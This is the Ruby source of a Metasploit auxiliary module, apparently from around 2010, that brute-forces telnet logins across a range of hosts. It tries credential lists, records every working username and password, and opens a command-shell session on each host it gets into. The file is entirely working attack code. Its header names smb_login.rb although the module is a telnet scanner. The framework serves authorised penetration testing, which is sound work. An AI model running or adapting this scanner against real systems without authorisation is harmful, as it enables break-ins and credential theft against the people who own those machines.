
##
# $Id: smb_login.rb 8121 2010-01-14 18:51:04Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


# 
# Ghetto
#
module CRLFLineEndings
	def put(str)
		return super if not str
		super(str.strip + "\r\n")
	end
end

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Telnet
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'Telnet Login Check Scanner',
			#'Version'     => '$Revision: 8121 $',
			'Description' => %q{
				This module will test a telnet login on a range of machines and
				report successful logins.  If you have loaded a database plugin
				and connected to a database this module will record successful
				logins and hosts so you can track your access.
			},
			'Author'      => 'egypt',
			'License'     => MSF_LICENSE
		)
		deregister_options('RHOST')
		register_options(
			[
				OptBool.new('VERBOSE', [ true, 'Verbose output', false])
			], Msf::Exploit::Remote::Telnet
		)

		@no_pass_prompt = []
	end

	attr_accessor :no_pass_prompt

	def run_host(ip)
		print_status("Starting host #{ip}")
		begin
			each_user_pass { |user, pass|
				try_user_pass(user, pass)
			}
		rescue ::Rex::ConnectionError
			return
		end
	end

	def try_user_pass(user, pass)
		this_cred = [user,rhost,rport].join(":")
		if self.credentials_tried[this_cred] == pass || self.credentials_good[this_cred] || self.no_pass_prompt.include?(this_cred)
			return :tried
		else
			self.credentials_tried[this_cred] = pass
		end
		print_status "#{rhost}:#{rport} Telnet - Attempting: '#{user}':'#{pass}'" if datastore['VERBOSE']

		ret = do_login(user,pass)
		if ret == :no_pass_prompt
			self.no_pass_prompt << this_cred
		else
			start_telnet_session if login_succeeded?
		end
	end

	# Making this serial since the @attempts counting business is causing
	# all kinds of syncing problems.
	def do_login(user,pass)
		connect
		if login_succeeded?
			report_telnet(user,pass)
			return :no_auth_required
		else
			send_user(user)
			if password_prompt?
				send_pass(pass)
				if login_succeeded?
					report_telnet(user,pass)
					return :success
				else
					disconnect
					return :fail
				end
			else
				if login_succeeded? && @recvd !~ /^#{user}\x0d*\x0a/
					report_telnet(user,pass)
					return :no_pass_required
				else
					disconnect
					return :no_pass_prompt
				end
			end
		end
	end

	def report_telnet(user,pass)
		this_cred = [user,rhost,rport].join(":")
		print_good("#{rhost} - SUCCESSFUL LOGIN #{user} : #{pass}")
		self.credentials_good[this_cred] = pass
		report_auth_info(
			:host	=> rhost,
			:proto	=> 'telnet',
			:user	=> user,
			:pass	=> pass,
			:targ_host	=> rhost,
			:targ_port	=> datastore['RPORT']
		)
	end

	def start_telnet_session
		# Windows telnet server requires \r\n line endings and it doesn't
		# seem to affect anything else.
		sock.extend(CRLFLineEndings)
		sess = Msf::Sessions::CommandShell.new(sock)
		framework.sessions.register(sess)
	end

end

